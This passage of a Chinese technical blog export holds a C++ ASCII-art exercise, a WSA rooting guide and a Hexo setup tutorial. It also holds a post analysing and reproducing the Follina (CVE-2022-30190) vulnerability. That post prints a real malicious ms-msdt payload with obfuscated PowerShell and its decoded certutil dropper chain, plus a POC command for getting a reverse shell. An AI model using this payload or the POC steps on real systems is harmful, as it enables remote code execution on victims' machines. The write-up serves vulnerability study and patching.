&quot;&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;&quot; &quot;&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;&quot;  &quot;&lt;&lt;n&lt;&lt;endl;    return 0;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-10：超级玛丽游戏"><a href="#1-1-10：超级玛丽游戏" class="headerlink" title="1.1-10：超级玛丽游戏"></a>1.1-10：超级玛丽游戏</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h3><p>超级玛丽是一个非常经典的游戏。请你用字符画的形式输出超级玛丽中的一个场景。</p><h3 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h3><p>无。</p><h3 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h3><p>如样例所示。</p><h3 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">（无）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">                ********               ************               ###....#.             #..###.....##....             ###.......#####              ###                 ###           ###           ###                ...........               #...#               #...#         #...#         #...#               ##*######                 #.#.#               #.#.#         #.#.#         #.#.#            ###*******#####             #.#.#               #.#.#         #.#.#         #.#.#           ...#***.****.*###....          #...#               #...#         #...#         #...#           ....**********##.....           ###                 ###           ###           ###           ....****    *****....             ###        ###           #####        ####################################################              ###########################...#......#.##...#......#.##...#......#.##------------------#              #...#......#.##------------------##################################------------------#              ############------------------##..#....#....##..#....#....##..#....#....################              #..#....#....################################################    #----------#                  ###########    #----------##.....#......##.....#......##.....#......#    #----------#                  #.....#......#    #----------#################################    #----------#                  ###########    #----------##.#..#....#..##.#..#....#..##.#..#....#..#    #----------#                  #.#..#....#..#    #----------#################################    #########                  ###########    #########<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>必须严格按样例输出，每行的行尾不能有空格。</p><h3 id="答案-9"><a href="#答案-9" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;int main() &#123;cout&lt;&lt;&quot;                ********&quot;&lt;&lt;endl;cout&lt;&lt;&quot;               ************&quot;&lt;&lt;endl;cout&lt;&lt;&quot;               ###....#.&quot;&lt;&lt;endl;cout&lt;&lt;&quot;             #..###.....##....&quot;&lt;&lt;endl;cout&lt;&lt;&quot;             ###.......#####              ###                 ###           ###           ###&quot;&lt;&lt;endl;cout&lt;&lt;&quot;                ...........               #...#               #...#         #...#         #...#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;               ##*######                 #.#.#               #.#.#         #.#.#         #.#.#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;            ###*******#####             #.#.#               #.#.#         #.#.#         #.#.#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;           ...#***.****.*###....          #...#               #...#         #...#         #...#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;           ....**********##.....           ###                 ###           ###           ###&quot;&lt;&lt;endl;cout&lt;&lt;&quot;           ....****    *****....&quot;&lt;&lt;endl;cout&lt;&lt;&quot;             ###        ###&quot;&lt;&lt;endl;cout&lt;&lt;&quot;           #####        #####&quot;&lt;&lt;endl;cout&lt;&lt;&quot;###############################################              ##########################&quot;&lt;&lt;endl;cout&lt;&lt;&quot;#...#......#.##...#......#.##...#......#.##------------------#              #...#......#.##------------------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;#################################------------------#              ############------------------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;#..#....#....##..#....#....##..#....#....################              #..#....#....################&quot;&lt;&lt;endl;cout&lt;&lt;&quot;################################    #----------#                  ###########    #----------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;#.....#......##.....#......##.....#......#    #----------#                  #.....#......#    #----------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;################################    #----------#                  ###########    #----------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;#.#..#....#..##.#..#....#..##.#..#....#..#    #----------#                  #.#..#....#..#    #----------#&quot;&lt;&lt;endl;cout&lt;&lt;&quot;################################    #########                  ###########    #########&quot;&lt;&lt;endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> NOI题库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-30190分析及复现和POC利用</title>
      <link href="/p/2022/60258585/"/>
      <url>/p/2022/60258585/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="/js/bai.js"></script><p>微软官方介绍：<a href="https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/">https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/</a></p><p>在微软官方的介绍里，我们可以看到，这个漏洞是从Word等调用应用程序使用URL协议，调用MSDT时存在远程执行代码漏洞。<br>成功利用此漏洞的攻击者可以使用调用应用程序的权限运行任意代码。<br>要利用此漏洞，攻击者只需要用户打开恶意文档即可，而且在保存为<strong>RTF文件</strong>后，用户<strong>只是预览恶意文件，不用单击或者双击恶意文件也会执行代码</strong>。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们可以在any.run上下载样例和漏洞代码，进行分析。<br><a href="https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/">https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/</a><br>我们将样例放到Kali linux上来进行分析。因为这个漏洞是从 Word 等调用应用程序<strong>使用URL协议调用MSDT时</strong>存在远程执行代码漏洞，也就是文档的<strong>xml文件</strong>从外部<strong>引用了一个链接</strong>，然后执行了恶意代码。<br>所以我们可以使用unzip命令解压word文档，来分析这个xml文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> 05-2022-0438.doc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>漏洞利用发生在这个<strong>word&#x2F;_rels&#x2F;document.xml</strong>里，我们打开分析，发现有一处地方引用了外部链接。<br>我们通过在any.run上查看这个被引用文件的源代码，发现重点是这一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"ms-msdt:/id PCWDiagnostic /skip force /param "</span>IT_RebrowseForFile<span class="token operator">=</span>cal<span class="token operator">?</span>c IT_LaunchMethod<span class="token operator">=</span>ContextMenu IT_SelectProgram<span class="token operator">=</span>NotListed IT_BrowseForFile<span class="token operator">=</span><span class="token function">h$</span><span class="token punctuation">(</span>Invoke<span class="token operator">-</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>Invoke<span class="token operator">-</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token string">'[System.Text.Encoding]'</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">58</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">58</span><span class="token operator">+</span><span class="token string">'UTF8.GetString([System.Convert]'</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">58</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">58</span><span class="token operator">+</span><span class="token string">'FromBase64String('</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">34</span><span class="token operator">+</span><span class="token string">'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='</span><span class="token operator">+</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token number">34</span><span class="token operator">+</span><span class="token string">'))'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>Windows<span class="token operator">/</span>System32<span class="token operator">/</span>mpsigstub<span class="token punctuation">.</span>exe IT_AutoTroubleshoot<span class="token operator">=</span>ts_AUTO<span class="token string">""</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析后得出：</p><pre class="line-numbers language-none"><code class="language-none">1. window.location.href：设置了一个窗口2. ms-msdt：是windows的诊断工具3. 之后就是ms-msdt的一些参数，不重要<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们可以看到代码调用了powershell，执行的内容经过了<strong>base64加密</strong>，我们解密看一下。<br>解密后可以看到以下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"c:\windows\system32<span class="token entity" title="\c">\c</span>md.exe"</span><span class="token punctuation">;</span>Start-Process <span class="token variable">$cmd</span> <span class="token parameter variable">-windowstyle</span> hidden <span class="token parameter variable">-ArgumentList</span> <span class="token string">"/c taskkill /f /im msdt.exe"</span><span class="token punctuation">;</span>Start-Process <span class="token variable">$cmd</span> <span class="token parameter variable">-windowstyle</span> hidden <span class="token parameter variable">-ArgumentList</span> <span class="token string">"/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar>1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>经过分析后我们可以看到代码的用意：</p><ol><li>启动隐藏窗口（<code>-windowstyle hidden</code>）</li><li>如果 msdt.exe 正在运行，则终止它</li><li>循环遍历 RAR 文件中的文件，查找编码 CAB 文件的 Base64 字符串（<code>for ... %i in ... do ...</code>）</li><li>将此 Base64 编码的 CAB 文件存储为1.t（<code>copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t</code>）</li><li>解码Base64编码的CAB文件保存为1.c（<code>certutil -decode 1.t 1.c</code>）</li><li>将1.c CAB文件展开到当前目录（<code>expand 1.c -F:* .</code>），最后：</li><li>执行rgb.exe</li></ol><p>关键就在这里，Windows会毫无限制的盲目执行这个powershell，如果我们修改成想执行的代码，就会导致远程代码执行漏洞。<br>漏洞利用的办法很简单，我们只需要修改一下这个xml文件，引用网站上的恶意代码就好了。<br>下面讲一下POC利用</p><h2 id="POC利用"><a href="#POC利用" class="headerlink" title="POC利用"></a>POC利用</h2><p>POC下载：<a href="https://github.com/JohnHammond/msdt-follina">https://github.com/JohnHammond/msdt-follina</a></p><p>获取shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 follina.py <span class="token parameter variable">-r</span> <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行后会在这个POC的目录里生成一个follina.doc文档，我们下载他，然后放到靶机上执行。<br>靶机执行后，成功拿到shell。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复漏洞很简单，现在微软已经发布了补丁，Windows 8.1, Windows Server 2012 R2, Windows Server 2012, Windows 7, Windows Server 2008 R2, Windows Server 2008 SP2安装补丁KB5015805即可。<br>Windows10, Windows11的累积更新中已经包含了漏洞补丁。</p><p>也可以在cmd中执行以下两条命令，删除msdt的注册表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reg <span class="token builtin class-name">export</span> HKEY_CLASSES_ROOT<span class="token punctuation">\</span>ms-msdt filenamereg delete HKEY_CLASSES_ROOT<span class="token punctuation">\</span>ms-msdt /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows安卓子系统(WSA)安装教程</title>
      <link href="/p/2022/68adcea5/"/>
      <url>/p/2022/68adcea5/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="/js/bai.js"></script><p>这篇文章讲一讲 WSA 怎么样拥有 Magisk + LSPosed</p><p><a href="https://apps.microsoft.com/store/detail/windows-subsystem-for-android%E2%84%A2-with-amazon-appstore/9P3395VX91NR?hl=en-us&gl=us">Windows Subsystem for Android™ with Amazon Appstore - Microsoft Store Apps</a></p><p>这是 Windows Subsystem for Android™ 的微软应用商店地址，但是不能在中国大陆地区安装。</p><p><img src="https://i.postimg.cc/jqM7BmJ4/1.png" alt="img"></p><p>所以我们需要使用安装包来安装它</p><p>安装包有两种，一种是官方的安装包，另一种是自己构建的安装包</p><p>gxl推荐使用自己构建的安装包，因为这样的安卓子系统有root</p><h1 id="构建并安装你自己的-WSA"><a href="#构建并安装你自己的-WSA" class="headerlink" title="构建并安装你自己的 WSA"></a>构建并安装你自己的 WSA</h1><p><a href="https://github.com/LSPosed/MagiskOnWSALocal">MagiskOnWSALocal</a></p><p>这是 LSPosed 官方发布的 MagiskOnWSA 的 Actions</p><p><img src="https://i.postimg.cc/mgJFtSX0/2.png" alt="MagiskOnWSA"></p><p>进入后 Fork 仓库</p><p>Fork 完后进入 Actions</p><p><img src="https://i.postimg.cc/DZN49PVv/3.png" alt="Github Actions"></p><p>点击绿色按钮</p><p>然后进入 <code>Build WSA</code> 这个 Workflow</p><p>运行 Workflow</p><p>配置如下</p><p><img src="https://i0.hdslb.com/bfs/album/c99cdec0fadaaad474c5b162751a10b98cea695b.png" alt="Workflow 配置"></p><p>如果你要更改也是可以的</p><p><code>Build arch</code> 代表构建的 WSA 版本，一般都是 x64</p><pre class="line-numbers language-none"><code class="language-none">WSA release type 是 WSA 发布的通道，一般选择 SlowMagisk version 是面具的版本，一般选择 Stable ，要尝鲜的可以用 Beta 或者 Canary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>Variants of gapps</code> 要选择 Pico, 选其他的也可以，不过工作流结束完后会有提示，<code>OpenGapps</code> 不支持 Android 12</p><p><code>Remove Amazon AppStore</code> 这个选 <code>remove</code> 就好，把亚马逊商店删掉</p><p><code>Root solution</code> 选 <code>Magisk</code> ，如果选 <code>None</code> 就没有 Root</p><p>选好之后点击 <code>Run Workflow</code></p><p>运行好后进入 <code>Artifacts</code> 下载构建产物<img src="https://i0.hdslb.com/bfs/album/1d4f388eeb36e1fa822be14f537f18709802f851.png" alt="下载构建产物"></p><p>这里的 1.95 GB 是源文件大小，我下载下来差不多是 860 MB 左右</p><p>下载完后解压</p><p>运行 <code>Install.ps1</code></p><p><img src="https://i0.hdslb.com/bfs/album/e160d68152d371e91a7e611860d5cca8f60637e2.png" alt="Install.ps1"></p><p>等到部署完成</p><p>这里 WSA 就安装完成了</p><h1 id="配置-WSA"><a href="#配置-WSA" class="headerlink" title="配置 WSA"></a>配置 WSA</h1><p>打开 WSA 设置</p><p>先配置图形</p><p><img src="https://i0.hdslb.com/bfs/album/9645173950d48ab71b861ef522e9ca9fe59a9e38.png" alt="配置图形和性能"></p><p>转到开发人员</p><p>打开开发人员模式</p><p><img src="https://i0.hdslb.com/bfs/album/2549ea27822245bdd9bbd88488f932bc8533d7f8.png" alt="开发人员模式"></p><h1 id="安装-ADB"><a href="#安装-ADB" class="headerlink" title="安装 ADB"></a>安装 ADB</h1><p>下载ADB: <a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">Android Platform Tools</a></p><p>安装 ADB, 解压到 C 盘（其他盘也可以）</p><p>进入高级系统设置 -&gt; 环境变量 -&gt; Path</p><p>把 ADB 目录写进去<img src="https://i0.hdslb.com/bfs/album/2f75f209084d73027936dcc61ed56d31707ea627.png" alt="ADB目录"></p><h2 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h2><p>在极少数情况下,会出现与驱动有关的错误,这可能就是你没有安装 adb 驱动 </p><p>驱动资源by: <a href="https://jamcz.com/">晨中网络科技</a> </p><p>进入 <a href="https://cz-jam.lanzoui.com/iTbJrtpfa5e">https://cz-jam.lanzoui.com/iTbJrtpfa5e</a> (提取码 intr) 下载.7z 文件并解压</p><p>在里面根据系统型号选择程序：32位系统 选择 x32 ，64位系统 选择 x64 这时问题应该就解决了</p><h1 id="配置-Magisk"><a href="#配置-Magisk" class="headerlink" title="配置 Magisk"></a>配置 Magisk</h1><p>打开 Magisk</p><p>点击小齿轮</p><p>把 <code>Systemless hosts</code> 和 <code>Zygisk</code> 打开</p><p><img src="https://i0.hdslb.com/bfs/album/9cdc91f8ea1f8b5418586015adc92f0a0338d072.png" alt="配置Magisk"></p><p>重启子系统</p><p>如果主页这样显示就 OK 了</p><p><img src="https://i0.hdslb.com/bfs/album/0703670b18b07223bbe9425f00613183aaf51e4d.png" alt="Magisk主页"></p><h1 id="安装-LSPosed"><a href="#安装-LSPosed" class="headerlink" title="安装 LSPosed"></a>安装 LSPosed</h1><p>下载LSPosed：<a href="https://github.com/LSPosed/LSPosed/">LSPosed Repo</a></p><p>下载最新的 <code>Release</code> 中的 <code>Zygisk</code> 版本</p><p>放到一个位置，右键复制文件位置</p><p>进入 Terminal</p><p>连接到 WSA</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb connect <span class="token number">127.0</span>.0.1:58526<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb push <span class="token operator">&lt;</span>文件位置<span class="token operator">></span> /sdcard/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&lt;文件位置&gt; 记得替换成你自己的</p><p>打开 Magisk 中的模块</p><p>从本地安装</p><p><img src="https://i0.hdslb.com/bfs/album/b19da1d0ac94e23e6c582bbd3fbe7a86f7d8c218.png" alt="安装LSPosed"></p><p>选择 Pixel 5</p><p>点击刚上传的 LSPosed</p><p><img src="https://i0.hdslb.com/bfs/album/c2ecbc06751b69fff99b757e7b968496f389a0ec.png" alt="上传LSPosed"></p><p>等待安装完成即可</p><h1 id="安装酷安"><a href="#安装酷安" class="headerlink" title="安装酷安"></a>安装酷安</h1><p>酷安下载：<a href="https://www.coolapk.com/">CoolAPK</a></p><p>下载酷安安装包</p><p>输入安装命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb <span class="token function">install</span> <span class="token operator">&lt;</span>文件位置<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="安装-MT-管理器"><a href="#安装-MT-管理器" class="headerlink" title="安装 MT 管理器"></a>安装 MT 管理器</h1><p>打开酷安</p><p>搜索 MT 管理器，下载并安装</p><h1 id="安装-LSPosed-Manager"><a href="#安装-LSPosed-Manager" class="headerlink" title="安装 LSPosed Manager"></a>安装 LSPosed Manager</h1><p>打开 MT 管理器，先授权超级用户权限</p><p>然后找到之前上传的 LSPosed 压缩包</p><p>右键长按并解压</p><p><img src="https://i0.hdslb.com/bfs/album/d075d9b1d29ffcb6e7cb4972aeb1233337e7a2bb.png" alt="解压LSPosed"></p><p>进入解压后的文件夹，找到 <code>Daemon.apk</code></p><p>点击它，然后点击功能 - &gt; 签名 -&gt; V3</p><p>签名完成后安装 <code>Daemon_sign.apk</code></p><p>接着找到 <code>Manager.apk</code></p><p>安装它即可</p><p><img src="https://i0.hdslb.com/bfs/album/e29760d8ef2c7fa2f6b3160f20b3c7b97d559cc0.png" alt="LSPosed"></p><p>这样就安装完成了</p><h1 id="如何安装-Magisk-x2F-LSPosed-模块"><a href="#如何安装-Magisk-x2F-LSPosed-模块" class="headerlink" title="如何安装 Magisk &#x2F; LSPosed 模块"></a>如何安装 Magisk &#x2F; LSPosed 模块</h1><h2 id="Magisk模块安装方法"><a href="#Magisk模块安装方法" class="headerlink" title="Magisk模块安装方法"></a>Magisk模块安装方法</h2><p>先下载模块，用 <code>adb push &lt;文件位置&gt; /sdcard/</code> 上传，然后安装即可</p><h2 id="LSPosed-模块安装方法"><a href="#LSPosed-模块安装方法" class="headerlink" title="LSPosed 模块安装方法"></a>LSPosed 模块安装方法</h2><p>进入 MT 管理器，找到上传的的模块 (APK), 安装他</p><p>然后进入 LSPosed Manager 启用即可</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> WSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo+Butterfly+Github+Vercel搭建博客</title>
      <link href="/p/2022/f607d2b5/"/>
      <url>/p/2022/f607d2b5/</url>
      
        <content type="html"><![CDATA[<h2 id="写在之前的话"><a href="#写在之前的话" class="headerlink" title="写在之前的话"></a>写在之前的话</h2><p>这篇文章会教你如何搭建一个<strong>属于你自己的博客网站</strong>。</p><p>教程使用Hexo搭建博客，请按照步骤一步一步来，若发现问题可及时反馈。</p><p>文章未完工，持续更新中。</p><p>那废话不多说，<del>才艺上一波</del> 让我们开始吧！</p><h2 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用Markdown等渲染引擎对文章进行解析，在几秒内，即可利用主题生成漂亮的静态网页。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装 Hexo 只需几分钟时间。</p><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li></ul><p>如果你的电脑中已经安装上述必备程序，那么你可以直接跳过此步骤。</p><p>如果你的电脑中尚未安装所需要的程序，请根据以下安装步骤完成安装。</p><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win">git</a>.</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li></ul><blockquote><p>Mac 用户</p><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p></blockquote><blockquote><p>Windows 用户</p><p>对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝 Git for Windows 镜像</a> 下载 git 安装包。</p></blockquote><p>检查：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>Node.js 为大多数平台提供了官方的 <a href="https://nodejs.org/en/download/">安装程序</a>。对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/node">淘宝 Node.js 镜像</a> 下载。</p><ul><li>Linux (Ubuntu, Debian): <code>sudo apt-get install nodejs npm</code></li><li>Linux (Fedora, Red Hat, CentOS):  <code>sudo yum install nodejs</code></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> <span class="token parameter variable">-v</span><span class="token function">npm</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装最新版本的 Hexo。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h2><p>安装Hexo完成后，执行下列命令，Hexo将会在指定文件夹中新建所需要的文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo init <span class="token string">"folder"</span>$ <span class="token builtin class-name">cd</span> <span class="token string">"folder"</span>$ <span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中”folder”替换为自己的的文件夹名。</p><p>新建完成后，文件夹的目录如下：</p><pre class="line-numbers language-none"><code class="language-none">.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的配置信息。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>npm安装的应用程序的信息。</p><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p>模版文件夹。当你新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果你修改scaffold&#x2F;post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>主题文件夹。Hexo会根据主题来生成静态页面。</p><h2 id="第一次运行"><a href="#第一次运行" class="headerlink" title="第一次运行"></a>第一次运行</h2><p>使用以下指令可以启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><p>如果出现了错误，可能是端口被占用了。你可以使用<code>-p</code>或<code>-port</code>来更改端口，如<code>hexo server -p 5000</code>则访问地址为：<code>http://localhost:5000/</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你看到的是这样，那么恭喜你，你可以继续了！</p><p><img src="https://s2.loli.net/2023/01/10/1vLCe9y68ns7HtF.png" alt="Hexo"></p><h1 id="部署到Github"><a href="#部署到Github" class="headerlink" title="部署到Github"></a>部署到Github</h1><p>进入 <a 